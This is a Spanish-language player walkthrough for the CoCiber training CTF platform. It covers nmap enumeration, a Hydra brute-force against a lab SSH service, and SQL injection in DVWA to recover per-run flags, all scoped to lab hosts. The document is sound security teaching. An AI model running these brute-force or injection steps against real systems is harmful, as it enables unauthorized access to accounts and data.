# 08. Demostración del jugador

**Antes:** el instructor debe completar [07. Grupos y piloto](07_GRUPOS_RETOS_Y_PILOTO.md), entregar una cuenta de jugador y publicar los retos de su grupo. Esta guía se ejecuta en el navegador de la plataforma y en la Kali asignada; no en el servidor web ni en PowerShell local.

Abre la URL de CoCiber que te entregó el instructor. Entra con `demo.blue`, `demo.purple` o tu cuenta asignada, no con `admin_ctf`. La contraseña inicial se entrega de forma privada. Si no aparecen retos, el instructor debe revisar grupo y publicación antes de continuar.

Entra con tu cuenta, cambia la clave inicial y abre un reto asignado. Pulsa Iniciar y espera: **en cola** significa que el reto o la Kali todavía están ocupados. La consola aparece dentro del reto cuando la preparación termina. Anota el run_id de 12 caracteres; identifica exclusivamente tu evidencia.

## ESC-02 — Acceso SSH de práctica

**Objetivo:** identificar el servicio didáctico, encontrar una credencial dentro de un diccionario pequeño y recuperar tu evidencia. Herramientas: nmap, Hydra y ssh, desde la Kali asignada.

1. Confirma que el destino es LAB-LNXVICT, `10.10.30.12`, puerto **2222**. El 22 es administrativo y no forma parte del ejercicio.
   En la consola de la Kali comprueba `hostname` y `command -v nmap hydra ssh`. Si falta una herramienta, avisa al instructor; su instalación debe completarse antes de la demo.
2. Enumera solo ese puerto y observa el servicio:

   ```bash
   nmap -sV -p 2222 10.10.30.12
   ```

3. El usuario de práctica es `ctf_` seguido del run_id que muestra tu reto. Construye el diccionario de doce candidatas:

   ```bash
   printf 'cociber%02d\n' {1..12} > candidatas.txt
   ```

4. Lee el identificador de tu corrida en CoCiber. En Kali, este bloque te lo solicita y solo ejecuta la prueba si tiene el formato correcto (12 caracteres hexadecimales en minúscula):

   ```bash
   read -rp 'run_id de tu corrida activa: ' run_id
   if [[ "$run_id" =~ ^[a-f0-9]{12}$ ]]; then
     hydra -l "ctf_${run_id}" -P candidatas.txt -s 2222 -t 2 -f 10.10.30.12 ssh
   else
     printf 'Formato incorrecto. Revisa el identificador antes de continuar.\n'
   fi
   ```

5. Solo si Hydra encontró una contraseña para esa cuenta, abre SSH desde **la misma terminal Kali**:

   ```bash
   ssh -p 2222 "ctf_${run_id}@10.10.30.12"
   ```

   Si pide confirmar la identidad del host, verifica la huella con el instructor. Escribe la contraseña encontrada cuando SSH la solicite. Ya dentro de LNXVICT:

   ```bash
   cat ~/flag.txt
   exit
   ```

   Copia la bandera completa y pégala en el campo del reto de CoCiber. `exit` vuelve a Kali. La guía no contiene una flag fija.
6. Al resolver, la corrida pasa por limpieza. Comprueba que termina liberada; no sigas usando una cuenta de una corrida cerrada.

## ESC-03 — Investigación SQL en DVWA

**Objetivo:** identificar una entrada vulnerable y recuperar la evidencia de tu corrida. Herramientas: navegador de la Kali y módulo SQL Injection de DVWA.

Inicia ESC-03 en CoCiber y espera a que esté activo. Anota su nuevo run_id; no reutilices el del reto SSH. Abre la sesión gráfica de Kali que el instructor dejó probada mediante [Guacamole](../01_Plataforma/03_GUACAMOLE_Y_CONEXIONES.md). La consola integrada es SSH y no muestra el navegador gráfico. Si todavía no existe ese acceso, el instructor debe prepararlo antes de iniciar esta demo.

1. En el escritorio de Kali abre Firefox y escribe `http://10.10.30.20/dvwa/` en la barra de direcciones. Usa la cuenta de práctica entregada por el instructor; no es la cuenta CoCiber ni la cuenta SQL de DVWA.
2. Selecciona nivel de seguridad Low para el ejercicio y localiza el campo indicado por el módulo.
3. Observa qué devuelve una entrada normal y cómo cambia la respuesta al alterar la estructura de la consulta. Determina el número y tipo de columnas antes de extraer datos.
4. Investiga la tabla `ctf_app_db.secrets`. La condición que identifica tu evidencia es `run_id = 'TU_RUN_ID'`. El esquema nuevo usa la columna `run_id`, no el `id` numérico de la instalación anterior.
5. Recupera únicamente tu columna `flag`, envíala en CoCiber y espera el cierre. Las filas de otras personas y la administración de las VM quedan fuera del ejercicio.
6. Si la víctima pasa a mantenimiento, el instructor debe completar su restauración; reiniciar el navegador no la habilita.

Al finalizar una práctica sin resolverla, vuelve al reto en CoCiber y pulsa **Cerrar corrida**. Espera que quede liberada; cerrar la pestaña del navegador no solicita por sí solo la limpieza.

## Escenarios de la siguiente fase

ESC-01, ESC-04 y ESC-05 **no están disponibles para iniciar**. Sus objetivos previstos son reconocimiento de un servicio confirmado, movimiento lateral Windows A→B y recuperación/transferencia controlada de un archivo Samba. Las guías finales del jugador se completarán después de validar esos servicios y sus helpers; consulta el [registro de pendientes](../04_Pendientes/01_ESTADO_Y_ENTREGABLES.md).

## Continuar con Windows y FTP

Cuando el acceso SSH a la Kali ya funciona, sigue [09. Preparación de Windows y FTP](09_PREPARACION_WINDOWS_Y_FTP.md). Esas guías preparan servicios y ensayos manuales; la publicación automática de ESC-04/05 continúa pendiente. Para los nuevos formularios y permisos consulta [05. Modales y usuarios](../01_Plataforma/05_MODALES_Y_GESTION_USUARIOS.md).
